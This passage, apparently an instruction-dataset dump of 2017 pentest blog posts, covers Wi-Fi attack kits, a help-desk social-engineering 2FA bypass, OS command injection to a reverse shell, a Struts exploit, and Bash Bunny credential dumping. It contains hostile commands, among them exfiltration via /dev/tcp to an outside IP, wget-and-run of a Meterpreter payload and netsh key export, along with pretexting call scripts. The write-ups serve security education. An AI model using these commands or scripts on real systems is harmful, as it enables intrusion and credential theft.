AWUS036NH\nAlfa gray AWUS051NH\nJoylive Yagi wireless antenna - 2.4gHZ 802.11b/g\n\nMultitude of small wifi adapters\nRaspberry Pi all running Kali with a custom hostapd config\n\nThe Pi 3\u2019s have an onboard wireless NIC, which was configured to broadcast a hidden cell for remote access\nAnother hostapd config broadcasts an 802.1X network that matched the customer\u2019s and offers a self-signed cert for authentication\nThe Alfa Panel Antenna worked fantastic here! I could walk around and overwhelm the signal strength of the ceiling mount APs and cause clients to jump over and attempt mutual authentication. That said, no hashes were gathered in the fake EAP tunnel, due to client configuration.\n\nRaspberry Pi running Kismet with an Alfa antenna and Kismet for capturing PSK handshakes\nHardware access point of convenience for use testing physical ports and Rogue AP countermeasures.\nNetSpot software for the heat map.\nProxmark 3 RFID Cloner\nRubber ducky with the WLAN profile retrieval script. This was deemed to be outside the scope of our engagement.\nWi-Fi Pineapple\nPortable Keyboards\nUSB Hubs; both powered and not powered\nTP Link Wireless N Mini Router\nEngenius EAP350\nPortable Power Packs (to wander freely with devices); Solar Charger, 10000mAh Solar Power Bank (20 bucks on Amazon)\nJosh Wright\u2019s Hacking Wireless Exposedfor reference\n\nNot pictured:\nWifi pineapple, laptopsBurner mobile deviceYagi antennaCoffeeJordanSally\n\nThe best information we were able to gather was through the Wi-Fi Pineapple. With the mini-monitor, we were able to get the Raspberry Pi authenticated to their guest network. From there, we could create NAT rules and appropriate routing to allow the physical ethernet interface access out to the world. Once the Pineapple was powered up and routing through the Pi\u2019s guest connection, we were able to launch a generic SSID harvesting attack and some other basically low value rogue wireless activities.\nWhat\u2019s in your onsite wireless kit?\n \n*Read Part 2 Here: https://www.blackhillsinfosec.com/wi-fi-travel-kit-v2-parts-list-backtrack/\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Go Ahead, Make Our Day\"\nTaxonomies: \"InfoSec 201, easter eggs, low hanging fruit, pen-testing, penetration testing, Pentesting, the best parts of our job\"\nCreation Date: \"Wed, 15 Feb 2017 15:54:29 +0000\"\nSally Vandeven & the BHIS Team //\n\nI was recently on an assessment where I was able to grab all the password hashes from the domain controller. When I extracted the hashes and saw that they were storing LANMAN hashes alongside the NTLM hashes I thought to myself \u2026. Wow. I LOVE my job! There are many moments on pentests that you feel as giddy as that puppy\u2026.\n\n \u2026. so I decided to ask the other BHIS testers the following question:\n\nWhen you are on in internal or pivot test, what is something that really \u201cmakes your day\u201d?\n\nAnd here is what they replied:\n\nFinding out that the organization grants administrator permissions to EVERYONE in the organization...now where is that Domain Admin logged in??  Hehehe  - David\n\nLogging on to the password cracker and finding that 50% of passwords have been cracked (bonus if they are domain admin passwords) - Rick\n\nWhen Google\u2019s answer to \u201c$product_name default password\u201d actually works. Double points if it\u2019s the controller for the door locks. - BBKing\n\nFinding passwords in draft messages within Outlook. Easier to spot when the draft is named \u201cPasswords\u201d. -Kelsey\n\nFinding passwords in documents or source code. Especially when they are database passwords. And then finding the database contains social security numbers.  - Ethan\n\nI love it when default credentials DON\u2019T work. I\u2019m so tired of telling that story. Other stories are so much more interesting to tell. Please make me come up with a better story. -Carrie\n\nAbusing security products to help further my malicious agenda. For example, getting access to a SIEM server, finding the web server\u2019s private key, then intercepting and decrypting IT/security staff logins to the console. -Beau\n\nWhen I get caught by a client\u2019s security team because they are doing the right thing and sufficiently monitoring log files and looking for anomalies in their environment.  Then working with them to further find gaps in their monitoring and IR process to better detect actual attackers.  Afterall, that\u2019s why we do this pentest thing, right?  To make the client better. -Derek\n\nWhen I\u2019m making phone calls to social engineer employees and after just a few attempts the employee has notified their admin who then notifies the entire company that they\u2019re being bombed with fake phone calls. As much as I want in, I really want people NOT to do what they are NOT supposed to do. -Sierra\n\nI once found an old baseboard management controller that was missed from the customer\u2019s vulnerability management program. The exposed TCP/49152 GET PSBlock plaintext password worked on every other system board I could find; HP iLO, Dell iDRAC, IBM BMC\u2026 -Jordan\n\nIf you look carefully at the above list, we like these things because they represent low-hanging fruit.  It lets us push the easy button. Now that might sound like pentesters are just inherently lazy but the truth is that our job is to mimic real attackers.  Attackers take the path of least resistance, which means starting with the obvious stuff: default passwords, guessable passwords, crackable passwords, hard-coded passwords, unpatched systems, cleartext sensitive data, etc.  If the easy stuff works and the attacker gets what s/he came for - game over.\n\nIf the customer\u2019s up their game and fix the easy stuff it forces us to up our game as well or we will put ourselves out of business.\n\nChallenge Accepted!\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"How to Bypass Two-Factor Authentication - One Step at a Time\"\nTaxonomies: \"External/Internal, Red Team, 2FA, ask and it will be given to you, bypassing 2fa, help desk, helpful help desk, MailSniper, OWA, password policy, passwords, pen-testing, penetration testing, pentest, Pentesting, two-factor, VPN\"\nCreation Date: \"Tue, 21 Feb 2017 15:43:26 +0000\"\nSally Vandeven //\n\nBack in November Beau Bullock wrote a blog post describing how his awesome PowerShell tool MailSniper can sometimes bypass OWA portals to get mail via EWS if it has not been configured with the same two-factor authentication (2FA) protection. \n\nI used that technique on a recent test and was able to abuse the situation even further. Here is my story...\n\nI did a password spray on an external OWA portal and discovered that the password for the user who we will call Jane Doe was Spring2017. But I was not able to login to Jane\u2019s account because it required, as you might have guessed, a time-sensitive token provided by 2FA. So I tried accessing Jane's mailbox via Exchange Web Service (EWS) using MailSniper and was able to retrieve Jane's mail messages from the server. Cool. So I can read her email. That is sort of interesting but not really interesting enough.\n\nI investigated what other external services were available on the organization\u2019s network and, pretty predictably, found a VPN but that was also protected by 2FA of course. Clearly I needed to get access to those 2FA tokens if I was going to get anywhere.\n\nHmm. On a crazy whim I waited until after hours and tried calling the organization\u2019s help desk hoping that someone was on call for off hours help. I waited until after hours in order to maximize the chances that the real Jane Doe would not access her email and get suspicious before I could get to it and mark it as \u201cRead\u201d or delete it altogether. Here is a paraphrased transcript of the call. \n\nHelp desk: Hello, this is Hal at the Acme Widget Help Desk. How can I help you? \n\nMe: Hi Hal. This is Jane Doe. I would like to add another phone to my account to use for two-factor authentication when I connect to Acme's network when I am away from the office. Is that possible?\n\nHal: Of course that is possible. I would be happy to help you get that set up. First, I need to know what type of phone it is. \n\nMe: It's an iPhone. \n\nHal: Okay and what is your email address, Jane?\n\nMe: It is jdoe@acmewidgets.com\n\nThis is the account for which I learned credentials from the password spray.\n\nHal: Great. Yes, I see your email address in the directory. I just sent an activation link to that account. You will need to open the email up on your phone and click the link. \n\nMe: Sure. Hang on...\n\nI execute MailSniper and pull the email from the server using EWS. Then I copy out the text of the email and paste it into a new outgoing email that I send to myself. I open the email on my phone and click the link.\n\nMe: Ok. It looks like I am all set up on my new phone. So normally a push notification is sent to my primary phone. How do I use the new secondary phone instead?\n\nHal: You enter your username and then your password but don't press enter. Instead, add a comma after the password then add the 6 digit code from the app on your phone.\n\nMe: I think I understand. Let me give it a try. \n\nI try tacking on the code as Hal described and was able to successfully login to the VPN as Jane Doe.\n\nMe: Thank you Hal. That worked perfectly! Now, just to be sure I understand -- the primary phone will continue to get push notifications unless I enter the code from my secondary phone in the password field when authenticating. Is that correct?\n\nI needed to be sure that the real Jane Doe was still able to access her account normally.\n\nHal: Yes, that's right. \n\nMe: You have been so helpful Hal. Thank you so much.\n\nHal: You are welcome and have a great day Jane!\n\nAt that point, I was able to authenticate to the VPN and get access to the organization\u2019s Intranet and was now a trusted insider. The next step would be to attempt to elevate privilege and pivot\u2026.and so the dominoes begin to fall\u2026.\n\nThe Problems\n\nIt started with a weak password policy. I was able to guess a user\u2019s password in a password spray attack.\n\nExchange Web Service was accessible without two-factor authentication.\n\nThe Help Desk did not authenticate me other than to incorrectly assume that since I had access to Jane Doe\u2019s mailbox, I must be Jane Doe.\n\nThe Solutions\n\nAlways use a strong password policy. At BHIS we recommend at minimum a 15  character passphrase.\n\nEWS is enabled by default with Exchange. If not needed, disable it altogether. If it is required, consider whitelisting only those applications that require access or enable it with 2FA.\n\nAuthenticate users before provisioning 2FA access tokens with more than just an email. Passwords are stolen and guessed all the time and for use cases such as 2FA, should not be considered sufficient authentication.\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"End-User Education: Getting the Parentals Onboard\"\nTaxonomies: \"InfoSec 101, Growing Pains, information security, Market Forces, Parents, Responsibility & Privilege, Supply & Demand\"\nCreation Date: \"Thu, 23 Feb 2017 16:12:37 +0000\"\nSierra Ward //\n\nWe\u2019re getting to that stage of life where we have to make some hard decisions regarding our parents.  How do we help them through sickness? When and how do we know when it might be time to convince them to reconsider driving? And when will it be time for them to say goodbye to the privilege of managing sensitive data online.  \nI recently had the tough conversation about password management with my own parents - as predicted, it was almost harder than telling them I was taking away the car. To be fair, I\u2019ve been having information security pep talks with them for a while now so this wasn\u2019t out of the blue sky. When I find good end user information I forward it to them. I\u2019ve explained to them about catching phishing emails, watching actual URLs, password hygiene, and how they need to stop using short easy passwords and actually, maybe... possibly... consider a password manager for longer more complex passwords.  But for the most part this was met with the fear of trying to learn a new system for everything they already do online.\nI try to be sensitive to this. It\u2019s easy to be frustrated with older people and their refusal to adopt new technology. But\u2026 I\u2019m sure that in just a few short years I\u2019ll be the old foghey who can\u2019t quite grasp new things when my own kids try to explain to me the new systems and requirements for the dawn of yet a new age. \nFinally, after years of nagging, my mom finally had me sit down with her and set up a password manager. I explained that as hard as it is to get used to, it will greatly simplify life.  She struggled at first and was a little perturbed when she realized having two-factor on meant she needed to basically be attached to her cell phone - ahhh, the universal mom struggle.\nShe upgraded her passwords and battened down all the hatches.  It was hard, and required several hours where I sat near her to answer questions.  But she did it.  Then the real struggle came.\n\u201cBut now I can\u2019t look at the bank accounts online!\u201d dad said, hugely perturbed that I\u2019d gone and wrecked the good thing he had going.\n\u201cWell, you need to open a password manager and you can share those particular passwords with mom,\u201d I told him.\n\u201cI\u2019m not going to do that!\u201d he said stubbornly.\n\u201cMom has shown great perseverance. She\u2019s done something frustrating and difficult for her. If you aren\u2019t able to take the time and energy to learn a new system then I\u2019m not sure you\u2019re responsible enough to manage financial information online.\u201d\nUnsurprisingly, he was not at all happy with this verdict.  But like most kids, I know exactly how much I can push my parents. I knew by his voice that as frustrated as he was by what I was telling him, he also knew I was right. He eventually admitted defeat and backed down from managing important accounts online. Mom breathed a sigh of relief as this verdict was a lot easier coming from me than from her. \nMom continued to surprise me in the following weeks, even calling her bank to turn on two-factor and making other customer demands from companies with whom she does business.  \nIt got me thinking, in the industry of info sec we\u2019re often frustrated by end-users. But perhaps, end-users are what will really take us over the brink for education and awareness in the wider marketplace.  Will it be end-users who demand better infosec practices from the businesses they patron?  Will it be end-users who force companies to get penetration tested and secure their products and services because they stop using those businesses services otherwise?  Either way, more education is always a good thing!  A high five to my mom for moving into this new age with panache and grace!\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"OS Command Injection; The Pain, The Gain\"\nTaxonomies: \"Red Team, Web App, All the Shellz, hacking, metasploit, msfvenom, netcat, OS Command Injection, pen-testing, Python, Real Life Hacking, Waiting\"\nCreation Date: \"Wed, 01 Mar 2017 15:56:04 +0000\"\nCarrie Roberts //\n\nOS Command Injection is fun. I recently found this vulnerability on a web application I was testing (thanks to Burp Suite scanner). I was excited because I knew shellz were in my future, but it was not as easy as I expected. Here was my journey and some things I learned.\n\nFirst, I knew the web server was Apache running on Red Hat Linux. I could inject the following ping command and receive a hit to my external server at 1.2.3.4 (let\u2019s pretend). The semicolon at the beginning is what separated the injected command from the original command expected by the application.\n\n;ping -c 3 1.2.3.4\n\nOn my external server I could use the tcpdump command to see the ping requests coming in.\n\ntcpdump -nni eth0 icmp\n\nThree Ping Requests Received on External Server\n\nSo with that, I was off to try all the things you do in this situation, such as is nicely explained here, but to no avail . . . \n\nThen I realized that on Red Hat the netcat executable is usually named ncat or netcat, so I modified the commands but that failed, too.\n\nI tried the following and that failed too . . .\n\ncat /etc/passwd > /dev/tcp/1.2.3.4/22\n\nI was confused. I definitely had command injection but nothing was working. I finally figured out that the command length was limited to 32 characters, likely because it was being written to a database first. I discovered this by sending the ping command over and over again with varying numbers of spaces until it stopped working.\n\nping -c 3 1.2.3.4\n\nping  -c 3 1.2.3.4\n\nping   -c 3 1.2.3.4\n\nping    -c 3 1.2.3.4\n\n. . . and so on\n\nThen on a whim I entered the following command and to my shock, the contents of the /etc/passwd file were returned in the server response.\n\ncat /etc/passwd\n\nI was shocked because no other commands including the ping command had returned the command output in the server response. Then I got really confused. I knew the echo command worked because I could receive the output from an echo command on my server as shown below. (Remember I was limited to 32 characters for the command).\n\necho h > /dev/tcp/1.2.3.4/80\n\nThe only file I could cat was /etc/passwd. I tried to write stuff to files using echo but it appeared I didn\u2019t have write access to the current directory I was in. So I wrote to files in the tmp directory but I couldn\u2019t read them with the 32-character command limit to be sure it was working.\n\nWhy could I cat the /etc/passwd file and get the output in the server response but no other file?\n\nFinally, I paid closer attention to the server response containing the contents of /etc/passwd and realized that it was found in the response header and not body. (There were a lot of users on the list and it scrolled off the screen)  The content of the /etc/passwd file, as shown in the example below, happens to be similar to a response header. \n\njsmith:x:1001:1000:Joe Smith,Room 1007,(234)555-8910,(234)555-0044,email:/home/jsmith:/bin/sh\n\nIn this case, the critical component is that there is a word followed by a colon, which happens to be in an acceptable format for inclusion as a response header. To test this theory, I injected the following. \n\necho some: h\n\nI received \u201csome: h\u201d in the web server response header. Finally, it was all making sense, now I was making progress. The following commands let me discover that no versions of netcat were installed, but Python was. Lovely, Python! The \u201c-n\u201d option tells echo not to output the trailing newline character. This was important so that the output of the next command would be on the same line and maintain the proper format for inclusion as a response header.\n\necho -n s:;which nc\n\necho -n s:;which ncat\n\necho -n s:;which netcat\n\necho -n s:;which python\n\nI used msfvenom to create the Python code to connect back to my Metasploit listener as described here. I named the Python script \u201cz\u201d and put it in my home directory. I tested out the Python code on my own Linux box but I kept getting \u201cTypeError: expected string without null bytes\u201d\n\nI realized that I had the stage encoder enabled on the Metasploit handler. When I disabled the stage encoder with \u201cset EnableStageEncoding false\u201d it worked.\n\nNext, I needed to get this python code written to a file on the web server. For this I hosted the file on my web server and used wget to write the file to disk with this injected command.\n\nwget \"myserver.net\" -O ~/z\n\nAnd then execute it with this.\n\npython ~/z\n\nThis successfully established a Meterpreter session for me, but I was limited in some respects due to the connection not being a true \u201ctty\u201d. I remember such a challenge at a recent \u201ccapture the flag\u201d event and a little Googling turned up the solution again.\n\npython -c 'import pty; pty.spawn(\"/bin/sh\")'\n\nAnd there we have it. My round-about methods for getting shell with OS command injection. In hindsight, it could have been so easy and quick, but hey, that\u2019s hacking.\n\nJoin the BHIS Blog Mailing List \u2013 get notified when we post new blogs, webcasts, and podcasts.\n\n[jetpack_subscription_form show_only_email_and_button=\"true\" custom_background_button_color=\"undefined\" custom_text_button_color=\"undefined\" submit_button_text=\"Subscribe\" submit_button_classes=\"undefined\" show_subscribers_total=\"true\" ]\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"The Wi-Fi Travel Kit v2 - Parts List Backtrack\"\nTaxonomies: \"Author, Jordan Drysdale, Red Team, Wireless, Hak5, Travel Bag, Wi-Fi Attack Kits, Wi-Fi travel kit, Wireless Gear\"\nCreation Date: \"Mon, 06 Mar 2017 18:02:59 +0000\"\nJordan Drysdale //\n\nThe Wi-Fi travel kit part one was popular enough that, back by demand, here are the specific parts, part numbers and links. \nPretty much everything on the list in the original post is available at the Hak5  team\u2019s shop. Sure, Amazon is like 2% cheaper and Prime shipping is hard to argue with, but we definitely like to support these folks: https://hakshop.com/collections/wireless-gear\nWi-Fi Pineapple: https://hakshop.com/products/wifi-pineapple?variant=81044992\nAlfa adapter (2.4 only): https://hakshop.com/collections/wireless-gear/products/alfa-usb-wifi-awus036neh\nTP-Link adapter also make the cut in a wireless travel kit: http://hackerwarehouse.com/product/tp-link-tl-wn722n/\nThis next item is worth discussing for a brief moment. The signal intensity on this bad boy can allow you to easily overwhelm the client wireless and roaming decisions. What I mean here is that if we look at the client RSSI algorithm and blast them with a high intensity SSID that matches the target network, the client has no choice mathematically except to jump over to our Wi-Fi. This antenna is a must have. Alfa Panel Antenna: https://hakshop.com/collections/wireless-gear/products/7dbi-panel-antenna\nThe Yagi. This thing is amazing and its transmission range is huge. Wandering through the SSIDs that lie just beyond the standard neighborhood wireless ecosystem is a frightening adventure. https://hakshop.com/collections/wireless-gear/products/16dbi-yagi-antenna\nIt is wise to carry several of the small form factor adapters. The Pi\u2019s board adapter can be used to run your hostapd configuration. The adapters can then be deployed as a remote management access point to the Kali build on the Pi. https://hakshop.com/collections/wireless-gear/products/ralink-usb-wifi-rt5370\nRubber Ducky, because you can steal Windows network and WLAN configurations: https://hakshop.com/products/usb-rubber-ducky-deluxe\nRaspberry Pi3, go for the kit, because why not? https://www.amazon.com/CanaKit-Raspberry-Clear-Power-Supply/dp/B01C6EQNNK/ref=sr_1_2?s=pc&ie=UTF8&qid=1488097176&sr=1-2&keywords=raspberry+pi+3\nThe TFT Monitor with HDMI works well for me. There are a ton of options for Pi based display, so definitely look around. https://www.amazon.com/Sunfounder-1024x600-Display-Monitor-Raspberry/dp/B012ZRYDYY/ref=sr_1_15?ie=UTF8&qid=1488098931&sr=8-15&keywords=tft+monitor\nKali Linux for Raspberry Pi. http://docs.kali.org/kali-on-arm/install-kali-linux-arm-raspberry-pi\nGPS Puck. This will allow you to geotag your wireless pcap data. Kismet and tcpdump will capture this GPS data if the puck is online. https://www.amazon.com/GlobalSat-BU-353-S4-USB-Receiver-Black/dp/B008200LHW/ref=sr_1_cc_1?s=aps&ie=UTF8&qid=1488097253&sr=1-1-catcorr&keywords=gps+puck\nThis is a quick forum on the GPS Puck and Kali Linux. https://forums.kali.org/showthread.php?3288-GlobalSat-BU-353-USB-GPS\nThe next item continues our airspace investigations but in a slightly different radio spectrum. RFID cloning is fun. http://hackerwarehouse.com/product/proxmark3-kit/\nThe Proxmark3 is the device I carry now, but it has been updated to be \u201cmore portable\u2026\u201d http://hackerwarehouse.com/product/proxmark3-rdv2-kit/\nThe following solar battery packs are larger than a field expedient battery pack should be, but the charge capacity at 15000mAh is fantastic. This will run my Pi rig with an external antenna attached for 24+ hours. https://www.amazon.com/FKANT-15000mAh-Portable-Flashlight-Cellphones/dp/B016ZFZ54E/ref=sr_1_5?ie=UTF8&qid=1488098594&sr=8-5&keywords=solar+battery+charger\nFor the more portable battery pack, this Anker is awesome. https://www.amazon.com/Anker-PowerCore-Lipstick-Sized-Generation-Batteries/dp/B005X1Y7I2/ref=sr_1_2?ie=UTF8&qid=1488098748&sr=8-2&keywords=lipstick+battery+charger\nThat is it for now.\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Strutting your stuff - Unauthenticated Remote Code Execution\"\nTaxonomies: \"External/Internal, Red Team, Web App, Apache Struts, Unauthenticated Remote Code Execution\"\nCreation Date: \"Fri, 10 Mar 2017 19:48:18 +0000\"\nCarrie Roberts //\n\nUnauthenticated Remote Code Execution? A hacker\u2019s best friend. And that is what we have with CVE-2017-5638 Apache Struts with working exploit code here: https://github.com/rapid7/metasploit-framework/issues/8064\n\nSave the exploit code to a file and execute with Python passing two command line arguments. The first command line argument is the URL to execute the attack against. The URL should point to a Struts \u201caction\u201d page which you can find with a Google search like \u201csite:example.com inurl:action\u201d\n\nAnd the second command line parameter is the OS command that you want to run against the exploited system. A complete example is given below:\n\npython exploit.py https://example.com/some/example.action \u201cls -l\u201d\n\nPerhaps you are a defender and want to ensure all your systems have been patched but you have multiple web servers behind your domain name. In this case, you will want to run the exploit against specific IP addresses as shown below.\n\npython exploit.py https://specific.ip.addr.here/some/example.action \u201cls -l\u201d\n\nThe Proof-of-Concept code will likely throw an SSL certificate error in this case. Make the following modifications (highlighted in yellow) to support this use case.\n\nThe inclusion of the Host header may not be required depending on your web server configuration.\n\nGood Luck, and get this fixed . . . yesterday!\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Social Engineering - Sometimes It's Too Easy\"\nTaxonomies: \"Red Team, Social Engineering, fun fun fun, helpful help desk, IT Help Desk, maternity leave, password reset, social engineering, VM\"\nCreation Date: \"Tue, 14 Mar 2017 15:38:36 +0000\"\nCarrie Roberts //\n\nA fun story from an adventure in social engineering not too long ago. Thought I'd pass on some things I learned and ways to be more prepared in the future.\nThe Goal\nCall the IT Help Desk for a customer and try to reset the password for five users. \nI was not provided the IT Help Desk number or the names of employees.\nI called the general contact number listed on the \u201ccontact us\u201d web page and asked for the phone # of the IT help desk. That was easy.\nI searched social media for employee names. That was easy too.\nThe Ruse\n I'm on maternity leave and can't access email via Outlook Web Access (OWA)\nFirst Call\nThe help desk asks for my employee number . . . \"Uh, I don't have that handy, can you look it up by my last name?\" . . . she does and then provides it to me.\nShe takes me through the built-in forgot password functionality where I can have an email or text sent to the number on file. I wasn't prepared for this and didn't want to send a reset to the actual employee so I pretended to do the reset and thanked her for helping me get in.\nSecond Call\nSame story but this time I'm prepared to say that the contact information for the password reset is not correct.\nAttendant asks me to go to a remote assistance site so she can connect to my computer. This gives her remote control of my test Virtual Machine (thankfully it is a VM specific to this customer).  I was not expecting this and I\u2019ve got the Burp Suite tool running in the background (hope she doesn\u2019t know what that tool is for). She brings up the login page and goes to enter my email address on the OWA login and a couple other employee logins come as autofill suggestions because of other accounts I already got access to through password spraying.\nThen she brings up Outlook where I'm already logged into another employee\u2019s account. (Oops!) ... I tell her it is a co-worker.\nThen she brings up the windows command prompt which says \"Users/Carrie Roberts\" , not the person I was posing as but this did not appear to raise suspicions.\nShe gives me a new password for the OWA account: \"Password@123\" and I'm in. I ask if I should change my password now and she says \"As you prefer\" ... interesting advice.\nThe Help Desk calls my cell number back . . . SIX TIMES . . . maybe they wanted the password back? I never answer but decide that perhaps I should be using my \"caller ID faker\" app, which I do for the remaining calls.\nThird Call\nUsing the caller ID faker this time, part way into the call the call drops . . . stupid app. I call back a couple of times and get back with the same person. She says 'I tried to call you back but it said it couldn't connect' ...\nMe: \"Uhhhhhhhh, that's odd... anyway, about that reset . . .\"\nAttendant says resetting my password requires manager approval. \nCrumbs . . .\nFourth Call\n\"Sorry, resetting your password is against security policy.\"\nBut she did say, \"My heart is in my throat for you,\" so that made me feel better!\nFifth Call\nI wait two days before making the last call. This time I created a new user account on my Windows VM with a username to match the ruse and no other suspicious things like concurrent logins as other employees.\nAttendant does the remote access thing to remotely control my PC. I play a baby crying soundtrack in the background to go along with the maternity leave ruse, I just had to. She says she will chat with me via the chat window and hangs up. I guess the baby was too much?\nShe uninstalls Microsoft office. Why? I don't know because I told her I wanted to login online to OWA and I even had it open. After that, she resets my password and enters it and lets me set the new password. Then she installs Office 365 from the victim's account and configures Outlook for me. I thank her and let her know that this will be very handy.\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"How to Get USB_Exfiltration Payload Using the Bash Bunny\"\nTaxonomies: \"Author, Jordan Drysdale, Red Team, Red Team Tools, all the payloads, bash bunny, Hak5, usb, usb exfiltrator, windows XP\"\nCreation Date: \"Thu, 16 Mar 2017 16:06:53 +0000\"\nJordan Drysdale //\n\nThis is a super quick write-up on the first very useful payload we tested and confirmed as 100% reliable on all Windows systems (XP-SP3+) with PowerShell enabled. \nBash Bunny Wiki: http://wiki.bashbunny.com/#!index.md\nPayload: https://github.com/hak5/bashbunny-payloads/tree/master/payloads/library/usb_exfiltrator\nThe most important piece is an understanding of the exceptionally simple switch positioning and directory structure. \n\nWe downloaded the entirety of the current payloads from the Bunny\u2019s git here: https://github.com/hak5/bashbunny-payloads\nThe only edits we made to the USB_Exfil payload before copying it over to the switch1 directory was to remove the .PDF reference. This allowed us to pull sub-directories inside the user\u2019s documents directory. \n\nBe very careful! Depending on the size of your target\u2019s Documents directory, you can fill the Bash Bunny\u2019s storage at just under 2GB.\n\nLastly, in testing this one out, the system has to be unlocked... :/\n Regardless, have fun!\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Cross-Post: MIR-SWAMP PEN TESTING WITH BLACK HILLS\"\nTaxonomies: \"Red Team, pentest, Software Assurance Marketplace, SWAMP, what a pen test looks like\"\nCreation Date: \"Tue, 21 Mar 2017 15:16:09 +0000\"\nThis is a cross-posted blog post written by A. Miller, from SWAMP - the Software Assurance Marketplace.  BHIS recently did an engagement with them and you can read about the entire experience on their website.\nThe SWAMP team prides itself on having a dedicated cybersecurity group. We take this responsibility very seriously. As proud as we are, it would be foolish to not seek review by someone unaffiliated with our project that can provide an objective assessment. So when the reputable cybersecurity firm Black Hills Information Security (BHIS) generously offered to perform a network penetration test, web application penetration test, and risk assessment all pro bono, we jumped at the opportunity. BHIS is owned by John Strand, one of the co-hosts of the popular Paul\u2019s Security Weekly podcast.\nThe pen test planning started with our staff providing a high level overview of the SWAMP network and DNS namespace to determine what resources would be considered in-scope and to plan the order in which the resources would be tested. It also gave us an opportunity to announce maintenance windows during times when user facing services would be tested. SWAMP users were notified of these windows in advance of the testing. However, the SWAMP\u2019s infrastructure was designed to handle significant network loads and was not disrupted by the pen test activities. The actual pen testing started on January 9th, 2017 with a reconnaissance phase in which BHIS....\nRead the rest here: https://continuousassurance.org/2017/03/16/mir-swamp-pen-testing-with-black-hills/\n \n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"How to Pull Wireless Credentials with the Bash Bunny\"\nTaxonomies: \"Red Team, Red Team Tools, bash bunny, BashBunny, bashbunny-payloads, Hak5, Wi-Fi Creds, Wireless Credentials\"\nCreation Date: \"Thu, 23 Mar 2017 16:34:11 +0000\"\nSally Vandeven //\n\nAll of the BHIS testers are pretty geeked about Hak5\u2019s newest toy -- the Bash Bunny. Last week, Jordan blogged about the USB Exfiltration payload. Today I will demo another nifty payload that was uploaded to their GitHub repo, WiPassDump. This module works on unlocked Windows machines to pull out the clear text credentials for any WEP or WPA/2-PSK wireless network profiles that have been saved on the computer. Basically, what this module does is force an administrator command prompt to run and then issue the following command \n\nnetsh wlan export profile key=clear\n\nSince the machine has to be unlocked anyway, you might be wondering why not just open a command prompt and run the above command manually? Why bother with the Bash Bunny? Here is why: When you are doing a physical penetration test or red team engagement you will often find unlocked workstations. If you are going to collect data from such a workstation it is much easier to be stealthy if all you have to do is plug-in a USB. You would not necessarily even need to sit down at the computer. Let\u2019s face it, typing on someone else\u2019s keyboard is definitely a red flag if someone were to notice you but standing near someone\u2019s desk (while you wait about 7 seconds for the Bash Bunny to do its job) can be much easier \u201cexplained\u201d if you get caught. \n\nHere is how to prep and launch the attack:\n\nFirst, put the bunny in arming mode (switch position 3, toward the insertion point) and grab the payload files here. \n\nSave the WiPassDump files into one of the attack folders; switch1 or switch2.\n\nOpen up payload.txt in a text editor and make sure the language settings match the language of the computer you will be running this on. The payload as uploaded is set up for a French Candian language machine. I have changed mine to US English.\n\nThe \u201cQ ALT y\u201d command means to enter the letter \u201cy\u201d when the UAC prompt is presented. This is the UAC elevation permission. Now save your changes and eject the drive.\n\nTo launch the attack move the switch to the switch position where you stored the payloads, in my case switch position 1\u2026..\n\n...and plug it into an unlocked machine. It took about 7 seconds for this to run on my Windows 8 machine. The netsh command that ran created a separate file for each of the wireless network profiles found on the system. Here is what it found on one of my test machines:\n\nEach of these files contains the SSID and where possible (WEP/WPA-PSK &WPA2-PSK), the passphrase:\n\nThen I tried running the script using an unprivileged account, a \u201cstandard\u201d user in Microsoft lingo. It didn\u2019t work. Interestingly enough an unprivileged user is allowed to successfully dump the wireless profiles including the passwords in cleartext.\n\nSo I modified the payload.txt file like this\u2026.\n\n\u2026.and it worked like a champ!\n\nNo administrator privilege needed.  I tested this attack against a standard user on a Windows 8 and a Windows 10 machine. I suspect it will work the same way on other versions as well.\n\nSo how do you prevent this type of attack, er, um, or at least limit the damage?\n\nDon\u2019t use WPA/2-PSK on corporate networks\n\nDon\u2019t leave workstations unlocked and unattended\n\nUse full disk encryption to thwart a Konboot lock-screen bypass attack\n\nDisable USB access on company-owned computers or limit to specific, known devices\n\nJoin the BHIS Blog Mailing List \u2013 get notified when we post new blogs, webcasts, and podcasts.\n\n[jetpack_subscription_form show_only_email_and_button=\"true\" custom_background_button_color=\"undefined\" custom_text_button_color=\"undefined\" submit_button_text=\"Subscribe\" submit_button_classes=\"undefined\" show_subscribers_total=\"true\" ]\n\nSally Vandeven //\n\nAll of the BHIS testers are pretty geeked about Hak5\u2019s newest toy -- the Bash Bunny. Last week, Jordan blogged about the USB Exfiltration payload. Today I will demo another nifty payload that was uploaded to their GitHub repo, WiPassDump. This module works on unlocked Windows machines to pull out the clear text credentials for any WEP or WPA/2-PSK wireless network profiles that have been saved on the computer. Basically, what this module does is force an administrator command prompt to run and then issue the following command \nnetsh wlan export profile key=clear\nSince the machine has to be unlocked anyway, you might be wondering why not just open a command prompt and run the above command manually? Why bother with the Bash Bunny? Here is why: When you are doing a physical penetration test or red team engagement you will often find unlocked workstations. If you are going to collect data from such a workstation it is much easier to be stealthy if all you have to do is plug-in a USB. You would not necessarily even need to sit down at the computer. Let\u2019s face it, typing on someone else\u2019s keyboard is definitely a red flag if someone were to notice you but standing near someone\u2019s desk (while you wait about 7 seconds for the Bash Bunny to do its job) can be much easier \u201cexplained\u201d if you get caught. \nHere is how to prep and launch the attack:\nFirst, put the bunny in arming mode (switch position 3, toward the insertion point) and grab the payload files here. \n\nSave the WiPassDump files into one of the attack folders; switch1 or switch2.\n\nOpen up payload.txt in a text editor and make sure the language settings match the language of the computer you will be running this on. The payload as uploaded is set up for a French Candian language machine. I have changed mine to US English.\n\nThe \u201cQ ALT y\u201d command means to enter the letter \u201cy\u201d when the UAC prompt is presented. This is the UAC elevation permission. Now save your changes and eject the drive.\nTo launch the attack move the switch to the switch position where you stored the payloads, in my case switch position 1\u2026..\n\n...and plug it into an unlocked machine. It took about 7 seconds for this to run on my Windows 8 machine. The netsh command that ran created a separate 